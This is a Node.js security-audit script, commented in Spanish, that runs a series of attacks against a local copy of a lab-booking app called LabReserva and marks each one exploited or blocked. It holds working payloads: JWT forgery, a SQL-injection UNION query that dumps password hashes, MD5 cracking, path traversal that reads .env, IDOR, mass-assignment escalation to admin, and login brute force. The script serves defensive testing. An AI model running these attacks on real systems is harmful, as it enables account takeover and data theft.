// Ataques de la auditoría de LabReserva. SOLO contra su copia en localhost.
// Uso:  node --env-file=.env scripts/attacks.mjs        (con el servidor corriendo)
// "EXPLOTADO" = el ataque funciona (vulnerable). "BLOQUEADO" = el control lo detiene.
import { createHmac, createHash } from 'node:crypto';
import { readFileSync, existsSync } from 'node:fs';

const BASE = process.env.BASE ?? 'http://localhost:3000';
const REAL_SECRET = process.env.JWT_SECRET ?? 'supersecreto';
const read = (p) => (existsSync(p) ? readFileSync(p, 'utf8') : '');

const call = async (path, { method = 'GET', token, body, raw, headers = {} } = {}) => {
  const res = await fetch(BASE + '/api' + path, {
    method,
    headers: {
      ...(body !== undefined || raw !== undefined ? { 'Content-Type': 'application/json' } : {}),
      ...(token && { Authorization: 'Bearer ' + token }),
      ...headers,
    },
    body: raw ?? (body !== undefined ? JSON.stringify(body) : undefined),
  });
  const text = await res.text();
  let json; try { json = JSON.parse(text); } catch { json = null; }
  return { status: res.status, text, json, headers: res.headers };
};

const login = async (email, password) => (await call('/auth/login', { method: 'POST', body: { email, password } })).json?.token;
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
const forge = (secret, claims) => {
  const data = b64({ alg: 'HS256', typ: 'JWT' }) + '.' + b64(claims);
  return data + '.' + createHmac('sha256', secret).update(data).digest('base64url');
};
const md5 = (s) => createHash('md5').update(s).digest('hex');

const results = [];
const check = async (id, titulo, fn) => {
  let r;
  try { r = await fn(); } catch (e) { r = { exploited: false, evidence: 'error en el test: ' + e.message }; }
  results.push({ id, titulo, ...r });
  console.log(`${r.exploited ? '🔴 EXPLOTADO ' : '🟢 BLOQUEADO '} ${id}  ${titulo}\n             ↳ ${r.evidence}`);
};

const ana = await login('ana@labreserva.test', 'ana12345');
if (!ana) { console.error('No se pudo iniciar sesión con Ana: ¿está corriendo el servidor?'); process.exit(1); }

await check('F01', 'GET /api/debug/config expone JWT_SECRET', async () => {
  const r = await call('/debug/config');
  const secret = r.json?.config?.jwtSecret;
  return { exploited: r.status === 200 && !!secret, evidence: `HTTP ${r.status}` + (secret ? `, jwtSecret="${secret}"` : '') };
});

await check('F01+F02', 'CADENA: secreto filtrado → token de admin falsificado', async () => {
  const leaked = (await call('/debug/config')).json?.config?.jwtSecret;
  if (!leaked) return { exploited: false, evidence: 'no hay secreto que filtrar' };
  const t = forge(leaked, { sub: '999', email: 'x@x', role: 'admin' });
  const r = await call('/admin/reservations', { token: t });
  return { exploited: r.status === 200, evidence: `GET /admin/reservations con token falso → HTTP ${r.status}` };
});

await check('F02', 'JWT_SECRET adivinable ("supersecreto") + token sin exp', async () => {
  const t = forge('supersecreto', { sub: '999', email: 'x@x', role: 'admin' });
  const r = await call('/admin/reservations', { token: t });
  const payload = JSON.parse(Buffer.from(ana.split('.')[1], 'base64url'));
  return { exploited: r.status === 200 || !('exp' in payload), evidence: `token forjado → HTTP ${r.status}; el token real de Ana ${'exp' in payload ? 'sí' : 'NO'} tiene exp` };
});

await check('F22', 'Aun con la llave, el rol/usuario debe venir de la BD (no del token)', async () => {
  const ghost = forge(REAL_SECRET, { sub: '999', email: 'x@x', role: 'admin', exp: Math.floor(Date.now() / 1000) + 600 });
  const lie = forge(REAL_SECRET, { sub: '3', email: 'ana@labreserva.test', role: 'admin', exp: Math.floor(Date.now() / 1000) + 600 });
  const a = await call('/admin/reservations', { token: ghost });
  const b = await call('/admin/reservations', { token: lie });
  return { exploited: a.status === 200 || b.status === 200, evidence: `usuario inexistente con rol admin → ${a.status}; Ana con rol admin en el token → ${b.status}` };
});

await check('F04', 'IDOR: Ana lee y cancela reservas de otros', async () => {
  const g = await call('/reservations/1', { token: ana });
  const d = await call('/reservations/3', { method: 'DELETE', token: ana });
  return { exploited: g.status === 200 || d.status === 204, evidence: `GET /reservations/1 (de Beto) → ${g.status}${g.json?.user ? ' (' + g.json.user + ')' : ''}; DELETE /reservations/3 (del profesor) → ${d.status}` };
});

await check('F08', 'GET /users entrega todos los usuarios con password_hash a un estudiante', async () => {
  const r = await call('/users', { token: ana });
  const leaked = Array.isArray(r.json) && r.json.some((u) => u.password_hash);
  return { exploited: r.status === 200 && leaked, evidence: `HTTP ${r.status}${leaked ? `, ${r.json.length} usuarios con password_hash` : ''}` };
});

await check('F06', 'SQL injection en /labs?search (UNION)', async () => {
  const payload = "x' UNION SELECT id, email, password_hash, 0, role FROM users--";
  const r = await call('/labs?search=' + encodeURIComponent(payload));
  const rows = Array.isArray(r.json) ? r.json : [];
  const adminRow = rows.find((x) => x.name === 'admin@labreserva.test');
  return { exploited: !!adminRow, evidence: `HTTP ${r.status}` + (adminRow ? `, admin@labreserva.test → hash ${adminRow.building}` : ', sin datos filtrados') };
});

await check('F06+F09', 'CADENA: SQLi → hashes MD5 → crackeo → login como admin', async () => {
  const payload = "x' UNION SELECT id, email, password_hash, 0, role FROM users--";
  const rows = (await call('/labs?search=' + encodeURIComponent(payload))).json;
  const admin = Array.isArray(rows) && rows.find((x) => x.name === 'admin@labreserva.test');
  if (!admin) return { exploited: false, evidence: 'no se obtuvieron hashes' };
  const word = ['123456', 'password', 'qwerty', 'admin123', 'letmein'].find((w) => md5(w) === admin.building);
  const t = word ? await login('admin@labreserva.test', word) : null;
  return { exploited: !!t, evidence: word ? `hash crackeado → "${word}", login admin OK` : 'hash no crackeado' };
});

await check('F07', 'Path traversal en /files?name=../../.env', async () => {
  const r = await call('/files?name=' + encodeURIComponent('../../.env'));
  return { exploited: r.status === 200 && r.text.includes('JWT_SECRET'), evidence: `HTTP ${r.status}${r.text.includes('JWT_SECRET') ? ', se leyó el .env: ' + r.text.split('\n').find((l) => l.startsWith('JWT_SECRET')) : ''}` };
});

await check('F11', 'Enumeración de usuarios en /auth/login (404 vs 401)', async () => {
  const a = await call('/auth/login', { method: 'POST', body: { email: 'nadie@labreserva.test', password: 'x' } });
  const b = await call('/auth/login', { method: 'POST', body: { email: 'ana@labreserva.test', password: 'mala' } });
  return { exploited: a.status !== b.status || a.json?.error !== b.json?.error, evidence: `email inexistente → ${a.status} "${a.json?.error}"; contraseña mala → ${b.status} "${b.json?.error}"` };
});

await check('F14', 'Stack trace en las respuestas de error', async () => {
  const r = await call('/no-existe');
  return { exploited: !!r.json?.stack, evidence: `HTTP ${r.status}${r.json?.stack ? ', stack: ' + r.json.stack.split('\n')[1].trim() : ', sin stack'}` };
});

await check('F15', 'Body de 200 KB aceptado (límite de 50 MB)', async () => {
  const r = await call('/auth/login', { method: 'POST', body: { email: 'a@a.a', password: 'x'.repeat(200_000) } });
  return { exploited: r.status !== 413, evidence: `HTTP ${r.status} (esperado 413 Payload Too Large)` };
});

await check('F16', 'CORS acepta cualquier origen con credenciales', async () => {
  const r = await call('/health', { headers: { Origin: 'https://evil.example' } });
  const o = r.headers.get('access-control-allow-origin');
  return { exploited: o === 'https://evil.example', evidence: `Access-Control-Allow-Origin: ${o ?? '(ausente)'}; Allow-Credentials: ${r.headers.get('access-control-allow-credentials') ?? '(ausente)'}` };
});

await check('F17', 'Headers de seguridad ausentes (helmet)', async () => {
  const r = await call('/health');
  const missing = ['content-security-policy', 'x-content-type-options', 'strict-transport-security'].filter((h) => !r.headers.get(h));
  return { exploited: !!r.headers.get('x-powered-by') || missing.length > 0, evidence: `X-Powered-By: ${r.headers.get('x-powered-by') ?? '(ausente)'}; faltan: ${missing.join(', ') || 'ninguno'}` };
});

await check('F18', 'Validación de entrada inexistente en reservas', async () => {
  const r = await call('/reservations', { method: 'POST', token: ana, body: { labId: 3, date: 'cualquier-cosa', startHour: -5, endHour: 99, purpose: 'x'.repeat(5000) } });
  return { exploited: r.status === 201, evidence: `reserva con fecha "cualquier-cosa", horas -5→99 y 5000 chars → HTTP ${r.status}` };
});

await check('F10', 'XSS almacenado: el frontend inserta comentarios con innerHTML sin escapar', async () => {
  const js = read('public/app.js');
  const unsafe = /\$\{\s*c\.body\s*\}/.test(js) || /\$\{\s*c\.author\s*\}/.test(js);
  const tokenInLS = /localStorage\.setItem\('token'/.test(js);
  return { exploited: unsafe, evidence: `public/app.js ${unsafe ? 'interpola c.body/c.author crudos en innerHTML' : 'escapa los valores'}; token en localStorage: ${tokenInLS ? 'SÍ (cadena XSS → robo de token)' : 'no'}` };
});

await check('F09', 'Contraseñas con MD5 sin sal', async () => {
  const bad = /createHash\('md5'\)/.test(read('src/lib/password.js'));
  return { exploited: bad, evidence: bad ? 'src/lib/password.js usa md5 sin sal' : 'hash con sal y costo (scrypt)' };
});

await check('F12', 'Se registran credenciales en texto plano en los logs', async () => {
  const bad = /console\.log\([^)]*req\.body/.test(read('src/modules/auth/auth.routes.js'));
  return { exploited: bad, evidence: bad ? "auth.routes.js: console.log('Intento de login:', req.body)" : 'no se registra el body del login' };
});

await check('F19', 'lodash 4.17.20 (CVE conocidos) en dependencias', async () => {
  const pkg = JSON.parse(read('package.json'));
  const v = pkg.dependencies?.lodash;
  return { exploited: !!v, evidence: v ? `package.json depende de lodash ${v}` : 'lodash ya no es dependencia' };
});

await check('F20', '.env no está en .gitignore (secretos al repositorio)', async () => {
  const bad = !/^\.env$/m.test(read('.gitignore'));
  return { exploited: bad, evidence: bad ? '.gitignore no incluye .env' : '.env ignorado' };
});

await check('F21', 'No existe registro de auditoría de seguridad', async () => {
  const has = existsSync('src/lib/audit.js');
  return { exploited: !has, evidence: has ? 'src/lib/audit.js presente' : 'sin log de login fallido / acceso denegado / borrados' };
});

// Estos dos modifican el estado: van al final.
await check('F05', 'Mass assignment: PATCH /users/me {role:"admin"} → escalada a admin', async () => {
  const p = await call('/users/me', { method: 'PATCH', token: ana, body: { role: 'admin' } });
  const t = await login('ana@labreserva.test', 'ana12345');
  const r = t ? await call('/admin/reservations', { token: t }) : { status: 'sin login' };
  return { exploited: r.status === 200, evidence: `PATCH → ${p.status}${p.json?.role ? ' role=' + p.json.role : ''}; nuevo login y GET /admin/reservations → ${r.status}` };
});

await check('F03', 'DELETE /admin/users/:id sin requireAdmin', async () => {
  const t = (await login('ana@labreserva.test', 'ana12345')) ?? ana;
  const r = await call('/admin/users/4', { method: 'DELETE', token: t });
  return { exploited: r.status === 204, evidence: `un estudiante elimina al usuario 4 → HTTP ${r.status}` };
});

await check('F13', 'Sin límite de intentos de login (fuerza bruta)', async () => {
  const codes = [];
  for (let i = 0; i < 25; i++) codes.push((await call('/auth/login', { method: 'POST', body: { email: 'mrojas@labreserva.test', password: 'intento' + i } })).status);
  return { exploited: !codes.includes(429), evidence: `25 intentos fallidos → códigos: ${[...new Set(codes)].join(', ')}` };
});

const n = results.filter((r) => r.exploited).length;
console.log(`\nResumen: ${n} ataques exitosos, ${results.length - n} bloqueados (de ${results.length}).`);
process.exitCode = n === 0 ? 0 : 1;
